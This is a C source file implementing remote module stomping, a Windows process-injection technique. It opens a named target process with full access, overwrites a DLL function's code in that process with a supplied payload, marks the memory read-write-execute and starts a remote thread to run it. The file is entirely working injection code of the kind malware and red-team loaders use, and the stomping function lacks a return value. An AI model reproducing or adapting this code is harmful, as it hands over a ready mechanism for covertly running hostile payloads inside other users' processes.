#include "RemoteStompingInjection.h"
#include <TlHelp32.h>

BOOL GetProcessHandleAndPid
(
	_In_ LPCWSTR TargetProcess,
	_Out_ HANDLE* ProcessHandle
)
{

	HANDLE SnapHandle = NULL;
	PROCESSENTRY32W pe32 = { 0 };
	pe32.dwSize = sizeof(pe32);

	if (!(SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) || SnapHandle == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Get a Snap Handle!");
		PRINT_ERROR("CreateToolhelp32Snapshot");
		return FALSE; // no point of continuing
	}

	if (!Process32FirstW(SnapHandle, &pe32))
	{
		WARN("Failed To Load First Process!");
		PRINT_ERROR("Process32FirstW");
		return FALSE;
	}

	do
	{

		if (_wcsicmp(pe32.szExeFile, TargetProcess) == 0)
		{

			if (!(*ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) || *ProcessHandle == NULL)
			{
				WARN("Failed To Get Process Handle!");
				PRINT_ERROR("OpenProcess");
				return FALSE;
			}

		}

	} while (Process32NextW(SnapHandle, &pe32));


	if (SnapHandle)
		CloseHandle(SnapHandle);

	return TRUE;

}

BOOL WritePayload
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID PayloadBuffer,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL State = TRUE;
	DWORD OldProtection = 0;
	SIZE_T NumberOfBytesWritten = 0;

	if (!VirtualProtectEx(ProcessHandle, PayloadBuffer, PayloadSize, PAGE_READWRITE, &OldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx 1");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Current Memory Protection: PAGE_READWRITE [RW]");

	if (!WriteProcessMemory(ProcessHandle, PayloadBuffer, Payload, PayloadSize, &NumberOfBytesWritten))
	{
		WARN("Failed To Write %zu Bytes to Remote Module!", NumberOfBytesWritten);
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Wrote %zu Bytes to Remote Module", NumberOfBytesWritten);

	if (!VirtualProtectEx(ProcessHandle, PayloadBuffer, PayloadSize, PAGE_EXECUTE_READWRITE, &OldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx 2");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Current Memory Protection: PAGE_EXECUTE_READWRITE [RWX]");

_END_FUNC:

	return State;

}

BOOL StompRemoteModule
(
	_In_ LPCWSTR TargetDll,
	_In_ LPCSTR TargetDllFunction,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL State = TRUE;
	HMODULE TargetModule = NULL;
	PVOID PayloadAddress = NULL;
	HANDLE ThreadHandle = NULL;

	if (!(TargetModule = LoadLibraryW(TargetDll)) || TargetModule == NULL)
	{
		WARN("Failed To Load %ls", TargetDll);
		PRINT_ERROR("LoadLibraryW");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Loaded %ls", TargetDll);

	if (!(PayloadAddress = GetProcAddress(TargetModule, TargetDllFunction)) || PayloadAddress == NULL)
	{
		WARN("Failed To Load Function: %s", TargetDllFunction);
		PRINT_ERROR("GetProcAddress");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Loaded Function: %s", TargetDllFunction);

	if (!WritePayload(ProcessHandle, PayloadAddress, Payload, PayloadSize))
	{
		WARN("Failed To Write Payload!");
		PRINT_ERROR("WritePayload");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Successfully Wrote Payload Address to Target Dll", PayloadAddress);

	if (!(ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, PayloadAddress, NULL, 0, NULL)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create Thread Pointing to Our Payload");
		PRINT_ERROR("CreateRemoteThread");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Created! Pointing to Our Payload", ThreadHandle);
	INFO("Waiting For Thread to Finish Executing...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

}